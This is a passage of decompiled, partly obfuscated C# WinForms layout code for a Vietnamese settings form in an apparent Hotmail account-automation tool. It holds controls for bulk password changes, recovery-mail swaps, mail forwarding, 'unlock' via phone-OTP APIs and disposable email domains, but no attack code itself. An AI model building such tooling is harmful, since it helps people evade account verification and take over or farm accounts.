		lblDomainGenerator.TabIndex = 202;
		lblDomainGenerator.Text = "Domain generator:";
		FB20EC0F.AutoSize = true;
		FB20EC0F.Font = new Font("Tahoma", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 163);
		FB20EC0F.Location = new Point(4, 37);
		FB20EC0F.Name = "lblDomainMoakt";
		FB20EC0F.Size = new Size(94, 16);
		FB20EC0F.TabIndex = 202;
		FB20EC0F.Text = "Domain moakt:";
		lblDomainGetnada.AutoSize = true;
		lblDomainGetnada.Font = new Font("Tahoma", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 163);
		lblDomainGetnada.Location = new Point(4, 8);
		lblDomainGetnada.Name = "lblDomainGetnada";
		lblDomainGetnada.Size = new Size(105, 16);
		lblDomainGetnada.TabIndex = 202;
		lblDomainGetnada.Text = "Domain getnada:";
		E7AC8526.Cursor = Cursors.Hand;
		E7AC8526.DropDownStyle = ComboBoxStyle.DropDownList;
		E7AC8526.FormattingEnabled = true;
		E7AC8526.Items.AddRange(new object[13]
		{
			"teml.net", "tmpeml.com", "tmpbox.net", "moakt.cc", "disbox.net", "tmpmail.org", "tmpmail.net", "tmails.net", "disbox.org", "moakt.co",
			"moakt.ws", "tmail.ws", "bareed.ws"
		});
		E7AC8526.Location = new Point(121, 34);
		E7AC8526.Name = "cbbDomainMoakt";
		E7AC8526.Size = new Size(206, 24);
		E7AC8526.TabIndex = 201;
		cbbDomainGetnada.Cursor = Cursors.Hand;
		cbbDomainGetnada.DropDownStyle = ComboBoxStyle.DropDownList;
		cbbDomainGetnada.FormattingEnabled = true;
		cbbDomainGetnada.Location = new Point(121, 5);
		cbbDomainGetnada.Name = "cbbDomainGetnada";
		cbbDomainGetnada.Size = new Size(206, 24);
		cbbDomainGetnada.TabIndex = 199;
		B52214B1.AutoSize = true;
		B52214B1.Font = new Font("Tahoma", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 163);
		B52214B1.Location = new Point(5, 109);
		B52214B1.Name = "label3";
		B52214B1.Size = new Size(93, 16);
		B52214B1.TabIndex = 207;
		B52214B1.Text = "Chọn loại mail:";
		D6861EA5.Cursor = Cursors.Hand;
		D6861EA5.DropDownStyle = ComboBoxStyle.DropDownList;
		D6861EA5.FormattingEnabled = true;
		D6861EA5.Location = new Point(131, 106);
		D6861EA5.Name = "cbbTypeEmail";
		D6861EA5.Size = new Size(211, 24);
		D6861EA5.TabIndex = 206;
		D6861EA5.SelectedIndexChanged += D6861EA5_SelectedIndexChanged;
		button2.Cursor = Cursors.Hand;
		button2.Location = new Point(189, 77);
		button2.Name = "button2";
		button2.Size = new Size(153, 25);
		button2.TabIndex = 205;
		button2.Text = "Proxy (get otp getnada)";
		button2.UseVisualStyleBackColor = true;
		button2.Click += D585DCA5;
		ckbXoaMailKhoiPhucCu.AutoSize = true;
		ckbXoaMailKhoiPhucCu.Cursor = Cursors.Hand;
		ckbXoaMailKhoiPhucCu.Font = new Font("Tahoma", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		ckbXoaMailKhoiPhucCu.Location = new Point(6, 323);
		ckbXoaMailKhoiPhucCu.Name = "ckbXoaMailKhoiPhucCu";
		ckbXoaMailKhoiPhucCu.Size = new Size(151, 20);
		ckbXoaMailKhoiPhucCu.TabIndex = 8;
		ckbXoaMailKhoiPhucCu.Text = "Xóa mail khôi phục cũ";
		ckbXoaMailKhoiPhucCu.UseVisualStyleBackColor = true;
		ECBE1706.AutoSize = true;
		ECBE1706.Cursor = Cursors.Hand;
		ECBE1706.Font = new Font("Tahoma", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		ECBE1706.Location = new Point(6, 18);
		ECBE1706.Name = "ckbThemKyTuGetnada";
		ECBE1706.Size = new Size(190, 20);
		ECBE1706.TabIndex = 8;
		ECBE1706.Text = "Thêm kí tự vào cuối hotmail:";
		ECBE1706.UseVisualStyleBackColor = true;
		ECBE1706.CheckedChanged += ECBE1706_CheckedChanged;
		plThemKyTuGetnada.BorderStyle = BorderStyle.FixedSingle;
		plThemKyTuGetnada.Controls.Add(cbbTypeKyTuHotmail);
		plThemKyTuGetnada.Controls.Add(A636C98A);
		plThemKyTuGetnada.Location = new Point(9, 39);
		plThemKyTuGetnada.Name = "plThemKyTuGetnada";
		plThemKyTuGetnada.Size = new Size(333, 33);
		plThemKyTuGetnada.TabIndex = 9;
		cbbTypeKyTuHotmail.Cursor = Cursors.Hand;
		cbbTypeKyTuHotmail.DropDownStyle = ComboBoxStyle.DropDownList;
		cbbTypeKyTuHotmail.FormattingEnabled = true;
		cbbTypeKyTuHotmail.Location = new Point(3, 4);
		cbbTypeKyTuHotmail.Name = "cbbTypeKyTuHotmail";
		cbbTypeKyTuHotmail.Size = new Size(112, 24);
		cbbTypeKyTuHotmail.TabIndex = 33;
		cbbTypeKyTuHotmail.SelectedIndexChanged += cbbTypeKyTuHotmail_SelectedIndexChanged;
		A636C98A.Location = new Point(121, 4);
		A636C98A.Name = "txtKyTuChiDinh";
		A636C98A.Size = new Size(206, 23);
		A636C98A.TabIndex = 7;
		label1.AutoSize = true;
		label1.Location = new Point(5, 80);
		label1.Name = "label1";
		label1.Size = new Size(123, 16);
		label1.TabIndex = 201;
		label1.Text = "Timeout get otp (s):";
		D417E99C.Location = new Point(131, 78);
		D417E99C.Maximum = new decimal(new int[4] { 999999, 0, 0, 0 });
		D417E99C.Name = "nudTimeoutGetOtpGetnada";
		D417E99C.Size = new Size(56, 23);
		D417E99C.TabIndex = 202;
		FDB50405.Controls.Add(EA9B35BD);
		FDB50405.Controls.Add(rbPassChiDinh);
		FDB50405.Controls.Add(rbPassRandom);
		FDB50405.Location = new Point(30, 212);
		FDB50405.Name = "grDoiPassHotmail";
		FDB50405.Size = new Size(346, 77);
		FDB50405.TabIndex = 203;
		FDB50405.TabStop = false;
		FDB50405.Text = "Đổi mật khẩu hotmail";
		EA9B35BD.Location = new Point(147, 47);
		EA9B35BD.Name = "txtPassChiDinh";
		EA9B35BD.Size = new Size(195, 23);
		EA9B35BD.TabIndex = 7;
		rbPassChiDinh.AutoSize = true;
		rbPassChiDinh.Cursor = Cursors.Hand;
		rbPassChiDinh.Font = new Font("Tahoma", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		rbPassChiDinh.Location = new Point(6, 48);
		rbPassChiDinh.Name = "rbPassChiDinh";
		rbPassChiDinh.Size = new Size(125, 20);
		rbPassChiDinh.TabIndex = 6;
		rbPassChiDinh.TabStop = true;
		rbPassChiDinh.Text = "Mật khẩu chỉ định";
		rbPassChiDinh.UseVisualStyleBackColor = true;
		rbPassChiDinh.CheckedChanged += D70A4C08;
		rbPassRandom.AutoSize = true;
		rbPassRandom.Cursor = Cursors.Hand;
		rbPassRandom.Font = new Font("Tahoma", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		rbPassRandom.Location = new Point(6, 22);
		rbPassRandom.Name = "rbPassRandom";
		rbPassRandom.Size = new Size(144, 20);
		rbPassRandom.TabIndex = 5;
		rbPassRandom.TabStop = true;
		rbPassRandom.Text = "Mật khẩu ngẫu nhiên";
		rbPassRandom.UseVisualStyleBackColor = true;
		grLoginHotmail.Controls.Add(AAAE63B2);
		grLoginHotmail.Controls.Add(ckbCloseChrome);
		grLoginHotmail.Font = new Font("Tahoma", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		grLoginHotmail.Location = new Point(30, 160);
		grLoginHotmail.Name = "grLoginHotmail";
		grLoginHotmail.Size = new Size(346, 46);
		grLoginHotmail.TabIndex = 205;
		grLoginHotmail.TabStop = false;
		grLoginHotmail.Text = "Login hotmail";
		AAAE63B2.AutoSize = true;
		AAAE63B2.Cursor = Cursors.Hand;
		AAAE63B2.Location = new Point(229, 22);
		AAAE63B2.Name = "ckbGetOAuth2";
		AAAE63B2.Size = new Size(110, 20);
		AAAE63B2.TabIndex = 33;
		AAAE63B2.Text = "Enable OAuth2";
		AAAE63B2.UseVisualStyleBackColor = true;
		ckbCloseChrome.AutoSize = true;
		ckbCloseChrome.Cursor = Cursors.Hand;
		ckbCloseChrome.Location = new Point(7, 22);
		ckbCloseChrome.Name = "ckbCloseChrome";
		ckbCloseChrome.Size = new Size(211, 20);
		ckbCloseChrome.TabIndex = 32;
		ckbCloseChrome.Text = "Đóng chrome sau khi đăng nhập";
		ckbCloseChrome.UseVisualStyleBackColor = true;
		grAddJunkEmail.Controls.Add(txtJunkEmail);
		grAddJunkEmail.Controls.Add(label6);
		grAddJunkEmail.Location = new Point(382, 528);
		grAddJunkEmail.Name = "grAddJunkEmail";
		grAddJunkEmail.Size = new Size(350, 52);
		grAddJunkEmail.TabIndex = 204;
		grAddJunkEmail.TabStop = false;
		grAddJunkEmail.Text = "Add Junk Email";
		txtJunkEmail.Location = new Point(131, 22);
		txtJunkEmail.Name = "txtJunkEmail";
		txtJunkEmail.Size = new Size(211, 23);
		txtJunkEmail.TabIndex = 34;
		label6.AutoSize = true;
		label6.Location = new Point(8, 25);
		label6.Name = "label6";
		label6.Size = new Size(76, 16);
		label6.TabIndex = 201;
		label6.Text = "Nhập email:";
		grForwardMail.Controls.Add(txtMailForward);
		grForwardMail.Controls.Add(DEB5189E);
		grForwardMail.Location = new Point(382, 470);
		grForwardMail.Name = "grForwardMail";
		grForwardMail.Size = new Size(350, 52);
		grForwardMail.TabIndex = 204;
		grForwardMail.TabStop = false;
		grForwardMail.Text = "Forward Mail";
		txtMailForward.Location = new Point(131, 22);
		txtMailForward.Name = "txtMailForward";
		txtMailForward.Size = new Size(211, 23);
		txtMailForward.TabIndex = 34;
		DEB5189E.AutoSize = true;
		DEB5189E.Location = new Point(8, 25);
		DEB5189E.Name = "label2";
		DEB5189E.Size = new Size(76, 16);
		DEB5189E.TabIndex = 201;
		DEB5189E.Text = "Nhập email:";
		grUnlockHotmail.Controls.Add(ckbThemMailKhoiPhuc);
		grUnlockHotmail.Controls.Add(cbbTypePhone);
		grUnlockHotmail.Controls.Add(txtApiPhone);
		grUnlockHotmail.Controls.Add(C53F2720);
		grUnlockHotmail.Controls.Add(BD1AD226);
		grUnlockHotmail.Controls.Add(label5);
		grUnlockHotmail.Controls.Add(nudTimeoutGetOtpPhone);
		grUnlockHotmail.Controls.Add(B2820710);
		grUnlockHotmail.Location = new Point(30, 470);
		grUnlockHotmail.Name = "grUnlockHotmail";
		grUnlockHotmail.Size = new Size(346, 131);
		grUnlockHotmail.TabIndex = 204;
		grUnlockHotmail.TabStop = false;
		grUnlockHotmail.Text = "Unlock hotmail";
		ckbThemMailKhoiPhuc.AutoSize = true;
		ckbThemMailKhoiPhuc.Cursor = Cursors.Hand;
		ckbThemMailKhoiPhuc.Location = new Point(6, 108);
		ckbThemMailKhoiPhuc.Name = "ckbThemMailKhoiPhuc";
		ckbThemMailKhoiPhuc.Size = new Size(145, 20);
		ckbThemMailKhoiPhuc.TabIndex = 202;
		ckbThemMailKhoiPhuc.Text = "Thêm mail khôi phục";
		ckbThemMailKhoiPhuc.UseVisualStyleBackColor = true;
		cbbTypePhone.Cursor = Cursors.Hand;
		cbbTypePhone.DropDownStyle = ComboBoxStyle.DropDownList;
		cbbTypePhone.DropDownWidth = 200;
		cbbTypePhone.FormattingEnabled = true;
		cbbTypePhone.Location = new Point(6, 22);
		cbbTypePhone.Name = "cbbTypePhone";
		cbbTypePhone.Size = new Size(135, 24);
		cbbTypePhone.TabIndex = 193;
		cbbTypePhone.SelectedIndexChanged += cbbTypePhone_SelectedIndexChanged;
		txtApiPhone.Location = new Point(147, 23);
		txtApiPhone.Name = "txtApiPhone";
		txtApiPhone.Size = new Size(195, 23);
		txtApiPhone.TabIndex = 34;
		txtApiPhone.Click += txtApiPhone_Click;
		C53F2720.Cursor = Cursors.Hand;
		C53F2720.Location = new Point(209, 51);
		C53F2720.Name = "btnNhapSdt";
		C53F2720.Size = new Size(133, 25);
		C53F2720.TabIndex = 205;
		C53F2720.Text = "Nhập số điện thoại";
		C53F2720.UseVisualStyleBackColor = true;
		C53F2720.Click += EB8B8187;
		BD1AD226.Location = new Point(147, 52);
		BD1AD226.Maximum = new decimal(new int[4] { 999999, 0, 0, 0 });
		BD1AD226.Name = "nudCountGetPhone";
		BD1AD226.Size = new Size(56, 23);
		BD1AD226.TabIndex = 38;
		label5.AutoSize = true;
		label5.Location = new Point(3, 54);
		label5.Name = "label5";
		label5.Size = new Size(137, 16);
		label5.TabIndex = 201;
		label5.Text = "Giới hạn số lần lấy sđt:";
		nudTimeoutGetOtpPhone.Location = new Point(147, 81);
		nudTimeoutGetOtpPhone.Maximum = new decimal(new int[4] { 999999, 0, 0, 0 });
		nudTimeoutGetOtpPhone.Name = "nudTimeoutGetOtpPhone";
		nudTimeoutGetOtpPhone.Size = new Size(56, 23);
		nudTimeoutGetOtpPhone.TabIndex = 38;
		B2820710.AutoSize = true;
		B2820710.Location = new Point(3, 83);
		B2820710.Name = "label4";
		B2820710.Size = new Size(123, 16);
		B2820710.TabIndex = 201;
		B2820710.Text = "Timeout get otp (s):";
		btnCancel.Anchor = AnchorStyles.Bottom;
		btnCancel.BackColor = Color.Maroon;
		btnCancel.Cursor = Cursors.Hand;
		btnCancel.FlatAppearance.BorderSize = 0;
		btnCancel.FlatStyle = FlatStyle.Flat;
		btnCancel.Font = new Font("Tahoma", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0);
		btnCancel.ForeColor = Color.White;
		btnCancel.Location = new Point(382, 305);
		btnCancel.Name = "btnCancel";
		btnCancel.Size = new Size(92, 29);
		btnCancel.TabIndex = 10;
		btnCancel.Text = "Đóng";
		btnCancel.UseVisualStyleBackColor = false;
		btnCancel.Click += btnCancel_Click;
		btnAdd.Anchor = AnchorStyles.Bottom;
		btnAdd.BackColor = Color.FromArgb(53, 120, 229);
		btnAdd.Cursor = Cursors.Hand;
		btnAdd.FlatAppearance.BorderSize = 0;
		btnAdd.FlatStyle = FlatStyle.Flat;
		btnAdd.Font = new Font("Tahoma", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0);
		btnAdd.ForeColor = Color.White;
		btnAdd.Location = new Point(284, 305);
		btnAdd.Name = "btnAdd";
		btnAdd.Size = new Size(92, 29);
		btnAdd.TabIndex = 9;
		btnAdd.Text = "Lưu";
		btnAdd.UseVisualStyleBackColor = false;
		btnAdd.Click += btnAdd_Click;
		bunifuCards1.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		bunifuCards1.BackColor = Color.White;
		bunifuCards1.BorderRadius = 0;
		bunifuCards1.BottomSahddow = true;
		bunifuCards1.color = Color.DarkViolet;
		bunifuCards1.Controls.Add(pnlHeader);
		bunifuCards1.LeftSahddow = false;
		bunifuCards1.Location = new Point(1, 0);
		bunifuCards1.Name = "bunifuCards1";
		bunifuCards1.RightSahddow = true;
		bunifuCards1.ShadowDepth = 20;
		bunifuCards1.Size = new Size(764, 37);
		bunifuCards1.TabIndex = 28;
		base.AutoScaleMode = AutoScaleMode.None;
		base.ClientSize = new Size(767, 349);
		base.Controls.Add(panel1);
		Font = new Font("Tahoma", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		base.FormBorderStyle = FormBorderStyle.None;
		base.Margin = new Padding(3, 4, 3, 4);
		base.Name = "fCauHinhHotmail";
		base.StartPosition = FormStartPosition.CenterParent;
		Text = "Cấu hình tương tác";
		base.Load += fCauHinhHotmail_Load;
		pnlHeader.ResumeLayout(performLayout: false);
		((ISupportInitialize)pictureBox1).EndInit();
		panel1.ResumeLayout(performLayout: false);
		FFA9AC19.ResumeLayout(performLayout: false);
		FFA9AC19.PerformLayout();
		grThemMailKhoiPhuc.ResumeLayout(performLayout: false);
		grThemMailKhoiPhuc.PerformLayout();
		B99B499A.ResumeLayout(performLayout: false);
		B99B499A.PerformLayout();
		plThemKyTuGetnada.ResumeLayout(performLayout: false);
		plThemKyTuGetnada.PerformLayout();
		((ISupportInitialize)D417E99C).EndInit();
		FDB50405.ResumeLayout(performLayout: false);
		FDB50405.PerformLayout();
		grLoginHotmail.ResumeLayout(performLayout: false);
		grLoginHotmail.PerformLayout();
		grAddJunkEmail.ResumeLayout(performLayout: false);
		grAddJunkEmail.PerformLayout();
		grForwardMail.ResumeLayout(performLayout: false);
		grForwardMail.PerformLayout();
		grUnlockHotmail.ResumeLayout(performLayout: false);
		grUnlockHotmail.PerformLayout();
		((ISupportInitialize)BD1AD226).EndInit();
		((ISupportInitialize)nudTimeoutGetOtpPhone).EndInit();
		bunifuCards1.ResumeLayout(performLayout: false);
		ResumeLayout(performLayout: false);
	}
}
